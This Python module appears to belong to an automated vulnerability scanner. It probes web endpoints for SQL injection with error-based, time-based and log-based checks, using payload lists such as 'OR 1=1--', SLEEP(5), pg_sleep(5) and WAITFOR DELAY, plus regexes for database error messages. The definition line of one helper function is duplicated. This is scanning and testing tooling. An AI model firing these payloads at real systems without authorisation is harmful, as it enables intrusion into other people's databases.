"""
SQL Injection Prober — three detection techniques:

1. ERROR-BASED   — inject payloads and scan the response body for known DB error strings.
                   Works purely from HTTP responses, no server access needed.

2. TIME-BASED    — inject sleep/delay payloads and measure response time.
                   If the response takes >= SLEEP_THRESHOLD seconds, injection is confirmed.
                   Works purely from HTTP responses, no server access needed.

3. LOG-BASED     — tail a local DB query log file after each injection.
                   If the raw injected SQL appears in the log, injection is confirmed.
                   Requires local server access (path to the log file).
                   Only runs if LOG_FILE_PATH is configured.
"""
import asyncio
import re
import time
from datetime import datetime, timezone
from pathlib import Path

import httpx

from config import TARGET_BASE_URL
from models.schemas import Endpoint, FuzzLog, VulnResult

# ── Configuration ────────────────────────────────────────────────────────────

# Seconds a response must take to count as a time-based confirmation
SLEEP_THRESHOLD: float = 4.5

# Path to the DB query log on the local machine (empty = skip log-based detection)
# MySQL:   /var/log/mysql/general.log  or  /tmp/mysql_general.log
# Postgres: set log_directory + log_filename in postgresql.conf
LOG_FILE_PATH: str = ""  # set via env or config if available

# ── Known DB error signatures ─────────────────────────────────────────────────

_DB_ERROR_PATTERNS = [
    # MySQL / MariaDB
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"mysql_fetch",
    r"supplied argument is not a valid mysql",
    r"unclosed quotation mark",
    # PostgreSQL
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"postgresql.*error",
    r"syntax error at or near",
    r"unterminated quoted string",
    # SQLite
    r"sqlite3\.operationalerror",
    r"sqlite_error",
    r"unrecognized token",
    # MSSQL
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"syntax error converting",
    # Oracle
    r"ora-\d{5}",
    r"oracle error",
    # Generic ORM leakage
    r"sequelizedatabaseerror",
    r"knex:.*error",
    r"typeorm.*queryrunner",
    r"prisma.*rawquery",
]

_DB_ERROR_RE = re.compile("|".join(_DB_ERROR_PATTERNS), re.IGNORECASE)

# Error-based: classic syntax-breaking payloads
_ERROR_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR "1"="1',
    "1; SELECT 1",
    "1' AND SLEEP(0)--",
    "\\",
]

# Time-based: payloads that cause the DB to sleep if injection succeeds
# Each tuple is (payload, expected_sleep_seconds)
_TIME_PAYLOADS = [
    ("1; SELECT SLEEP(5)--",          5),   # MySQL
    ("1' AND SLEEP(5)--",             5),   # MySQL string context
    ("1; SELECT pg_sleep(5)--",       5),   # PostgreSQL
    ("1' AND pg_sleep(5)--",          5),   # PostgreSQL string context
    ("1; WAITFOR DELAY '0:0:5'--",    5),   # MSSQL
    ("1 AND 1=1 UNION SELECT 1,2,3--", 0),  # Union probe (no sleep, checks for extra data)
]


# ── Helpers ───────────────────────────────────────────────────────────────────

def _inject_into_url(base_url: str, path: str, payload: str) -> str:
    """Replace the last path segment (or first path param) with the payload."""
def _inject_into_url(base_url: str, path: str, payload: str) -> str:
    """Replace the last path segment (or first path param) with the payload."""
    # Use a lambda replacement so payload is treated as a literal string,
    # not a regex replacement pattern (avoids bad escape on backslashes etc.)
    injected = re.sub(r"\{[^}]+\}", lambda _: payload, path, count=1)
    if injected == path:
        # No placeholder — append to the last path segment
        injected = path.rstrip("/") + "/" + payload
    return base_url.rstrip("/") + injected


def _inject_into_query(base_url: str, path: str, payload: str) -> str:
    """Append the payload as a query string parameter."""
    clean_path = re.sub(r"\{[^}]+\}", lambda _: "1", path)
    return base_url.rstrip("/") + clean_path + f"?q={payload}&search={payload}"


async def _timed_request(
    client: httpx.AsyncClient,
    method: str,
    url: str,
    headers: dict,
) -> tuple[int, str, float]:
    """Return (status, body, elapsed_seconds)."""
    start = time.monotonic()
    try:
        resp = await client.request(method=method, url=url, headers=headers)
        elapsed = time.monotonic() - start
        return resp.status_code, resp.text[:1000], elapsed
    except httpx.RequestError as e:
        elapsed = time.monotonic() - start
        return 0, f"Request error: {e}", elapsed


def _read_log_tail(log_path: str, n_lines: int = 50) -> str:
    """Read the last n_lines from a log file."""
    try:
        p = Path(log_path)
        if not p.exists():
            return ""
        lines = p.read_text(errors="replace").splitlines()
        return "\n".join(lines[-n_lines:])
    except Exception:
        return ""


def _log_contains_payload(log_tail: str, payload: str) -> bool:
    """Check if the raw payload string appears in the log tail."""
    # Strip SQL comments and whitespace for a looser match
    clean = re.sub(r"--.*$", "", payload, flags=re.MULTILINE).strip()
    return clean.lower() in log_tail.lower()


# ── Main prober ───────────────────────────────────────────────────────────────

async def probe_sqli(
    session_id: str,
    endpoint: Endpoint,
    base_url: str,
    auth_token: str = "Bearer token_user_a",
    log_file_path: str = LOG_FILE_PATH,
) -> tuple[list[FuzzLog], VulnResult]:
    """
    Run all three SQL injection detection techniques against an endpoint.
    Returns (logs, VulnResult) — no LLM calls made.
    """
    headers = {
        "Authorization": auth_token,
        "Content-Type": "application/json",
    }
    method = endpoint.method if endpoint.method in ("GET", "POST") else "GET"
    logs: list[FuzzLog] = []
    attempt = 0

    confirmed_technique = None
    confirmed_payload = None
    confirmed_evidence = None

    async with httpx.AsyncClient(timeout=12.0) as client:

        # ── Technique 1: Error-based ──────────────────────────────────────
        for payload in _ERROR_PAYLOADS:
            attempt += 1
            url = _inject_into_url(base_url, endpoint.path, payload)
            status, body, _ = await _timed_request(client, method, url, headers)

            log = FuzzLog(
                session_id=session_id,
                endpoint=endpoint.path,
                attempt_number=attempt,
                request={"method": method, "url": url, "headers": headers, "body": None,
                         "sqli_technique": "error_based", "payload": payload},
                response_status=status,
                response_body=body,
                timestamp=datetime.now(timezone.utc).isoformat(),
            )
            logs.append(log)

            if _DB_ERROR_RE.search(body):
                confirmed_technique = "error_based"
                confirmed_payload = payload
                confirmed_evidence = (
                    f"Payload `{payload}` triggered a DB error in the response.\n"
                    f"Status: {status}\nBody excerpt: {body[:300]}"
                )
                break  # one confirmation is enough

        if confirmed_technique:
            return logs, _build_result(session_id, endpoint, confirmed_technique,
                                       confirmed_payload, confirmed_evidence)

        # ── Technique 2: Time-based blind ─────────────────────────────────
        for payload, expected_sleep in _TIME_PAYLOADS:
            attempt += 1
            url = _inject_into_url(base_url, endpoint.path, payload)
            status, body, elapsed = await _timed_request(client, method, url, headers)

            log = FuzzLog(
                session_id=session_id,
                endpoint=endpoint.path,
                attempt_number=attempt,
                request={"method": method, "url": url, "headers": headers, "body": None,
                         "sqli_technique": "time_based", "payload": payload,
                         "expected_sleep": expected_sleep},
                response_status=status,
                response_body=f"[elapsed: {elapsed:.2f}s] {body}",
                timestamp=datetime.now(timezone.utc).isoformat(),
            )
            logs.append(log)

            if expected_sleep > 0 and elapsed >= SLEEP_THRESHOLD:
                confirmed_technique = "time_based"
                confirmed_payload = payload
                confirmed_evidence = (
                    f"Payload `{payload}` caused a {elapsed:.2f}s delay "
                    f"(threshold: {SLEEP_THRESHOLD}s). "
                    f"Time-based blind SQL injection confirmed."
                )
                break

        if confirmed_technique:
            return logs, _build_result(session_id, endpoint, confirmed_technique,
                                       confirmed_payload, confirmed_evidence)

        # ── Technique 3: Log-based (local only) ───────────────────────────
        if log_file_path:
            for payload in _ERROR_PAYLOADS[:3]:  # just a few — log check is fast
                attempt += 1
                url = _inject_into_url(base_url, endpoint.path, payload)

                # Snapshot log before request
                log_before = _read_log_tail(log_file_path)

                status, body, _ = await _timed_request(client, method, url, headers)

                # Small pause to let the DB flush the log
                await asyncio.sleep(0.2)
                log_after = _read_log_tail(log_file_path)

                # Only look at new lines added after our request
                new_lines = log_after[len(log_before):]

                log = FuzzLog(
                    session_id=session_id,
                    endpoint=endpoint.path,
                    attempt_number=attempt,
                    request={"method": method, "url": url, "headers": headers, "body": None,
                             "sqli_technique": "log_based", "payload": payload},
                    response_status=status,
                    response_body=body,
                    timestamp=datetime.now(timezone.utc).isoformat(),
                )
                logs.append(log)

                if _log_contains_payload(new_lines, payload):
                    confirmed_technique = "log_based"
                    confirmed_payload = payload
                    confirmed_evidence = (
                        f"Payload `{payload}` appeared verbatim in the DB query log "
                        f"at `{log_file_path}` after the request.\n"
                        f"Log excerpt: {new_lines[:300]}"
                    )
                    break

        if confirmed_technique:
            return logs, _build_result(session_id, endpoint, confirmed_technique,
                                       confirmed_payload, confirmed_evidence)

    # No technique confirmed injection
    result = VulnResult(
        session_id=session_id,
        endpoint=endpoint.path,
        attack_type="SQLI",
        verdict="NO_VULNERABILITY",
        evidence="No SQL injection indicators found across error-based, time-based, and log-based probes.",
        reasoning=(
            f"Tested {attempt} payloads across three techniques. "
            "No DB error strings detected, no abnormal response delays, "
            "and no raw SQL appeared in the query log."
        ),
    )
    return logs, result


def _build_result(
    session_id: str,
    endpoint: Endpoint,
    technique: str,
    payload: str,
    evidence: str,
) -> VulnResult:
    technique_labels = {
        "error_based": "Error-Based SQL Injection",
        "time_based":  "Time-Based Blind SQL Injection",
        "log_based":   "Log-Confirmed SQL Injection",
    }
    return VulnResult(
        session_id=session_id,
        endpoint=endpoint.path,
        attack_type="SQLI",
        verdict="EXPLOIT_CONFIRMED",
        evidence=evidence,
        reasoning=(
            f"Technique: {technique_labels.get(technique, technique)}.\n"
            f"Payload used: `{payload}`.\n"
            f"The endpoint does not sanitize or parameterize user input before "
            f"passing it to the database."
        ),
    )
